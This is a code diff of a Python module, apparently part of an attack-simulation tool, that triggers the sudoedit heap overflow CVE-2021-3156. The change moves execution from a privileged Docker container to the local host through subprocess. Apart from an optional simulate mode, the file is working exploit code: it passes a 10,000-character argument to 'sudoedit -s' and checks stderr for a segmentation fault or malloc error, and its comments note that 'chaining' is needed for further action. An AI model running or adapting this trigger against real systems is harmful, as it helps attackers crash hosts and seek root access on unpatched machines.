@@ -1,23 +1,28 @@
-# Path: attacks/cve_2021_3156.py
+import subprocess
 
-def run(container, simulate=False):
-    print("[*] Running sudoedit Heap Overflow (CVE-2021-3156)...")
+def run(container=None, simulate=False):
+    print("[*] Running sudoedit Heap Overflow Exploit (CVE-2021-3156)...")
 
     if simulate:
-        print(f"[SIMULATE] Would attempt to invoke sudoedit with crafted overflow arguments in '{container.name}'")
-        print("[SIMULATE] If vulnerable, this would result in a heap buffer overflow and potential root access.")
-        return "Simulated run: No command executed."
+        print("[SIMULATE] Would run crafted sudoedit argument to trigger heap overflow.")
+        return "Simulated sudoedit overflow run."
 
     try:
-        # ⚠️ REAL PAYLOAD EXECUTION
-        # Run sudoedit with an overflow-inducing argument pattern
-        command = "sudoedit -s '\\' `perl -e 'print \"A\" x 10000'`"
-        result = container.exec_run(command, privileged=True)
+        # Placeholder for real exploit logic
+        # This command is based on public PoC structure to trigger the overflow
+        overflow_arg = "A" * 10000  # overly long string to cause overflow in vulnerable sudo
 
-        output = result.output.decode()
-        print(f"[+] sudoedit output:\n{output}")
-        return "Executed: sudoedit overflow pattern sent"
+        result = subprocess.run(
+            ["sudoedit", "-s", overflow_arg],
+            capture_output=True,
+            text=True
+        )
+
+        if "Segmentation fault" in result.stderr or "malloc" in result.stderr:
+            print("[+] Exploit triggered potential overflow condition.")
+            return "Exploit may have triggered overflow. Further action or chaining required."
+        else:
+            return f"Exploit executed, but no obvious crash: {result.stderr.strip()}"
 
     except Exception as e:
-        print(f"[!] Exploit failed: {e}")
-        return f"Failed: {str(e)}"
+        return f"Exploit failed: {str(e)}"
